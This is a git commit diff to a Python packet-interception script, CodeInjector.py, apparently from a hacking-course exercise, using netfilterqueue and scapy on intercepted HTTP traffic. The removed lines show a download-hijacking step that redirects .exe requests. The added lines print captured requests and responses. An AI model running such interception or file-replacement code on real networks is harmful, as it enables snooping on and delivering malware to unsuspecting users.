1987e7866ecd72e23ce4ce8052f0254fffc38ffb
Paul St. Amour <paul35444@aol.com>
2021-04-23 19:53:45 -0500

    -removed code in the if statements that modify packets -added print states that will show HTTP requests and responses

--- CodeInjector.py
+++ CodeInjector.py
@@ -2,8 +2,7 @@
 import netfilterqueue
 import scapy.all as scapy
 
-#list for acknowledged field in packet
-ack_list = []
+
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -17,24 +16,14 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 #check packets RAW layer
     if scapy_packet.haslayer(scapy.RAW):
-#check packets destination port for 80 (http)
+#check packets destination port for 80 (http) REQUESTS
         if scapy_packet[scapy.TCP].dport == 80:
-#if state to find exe files in Raw layer
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] .exe Request")
-#append(add) ack field of each captured packet to the ack_list above
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-
-#check packets source port for 80 (http)
+            print("[+] Request")
+            print(scapy_packet.show())
+#check packets source port for 80 (http) RESPONSES
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-#remove seq field from each captured packet once it has been processed
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing File")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: www.microsoft.com\n\n")
-
-#set scapy_packet to a string and set payload which will save the packet
-                packet.set_payload(str(modified_packet))
+            print("[+] Response")
+            print(scapy_packet.show())
     packet.accept()
 
 #create instance of queue
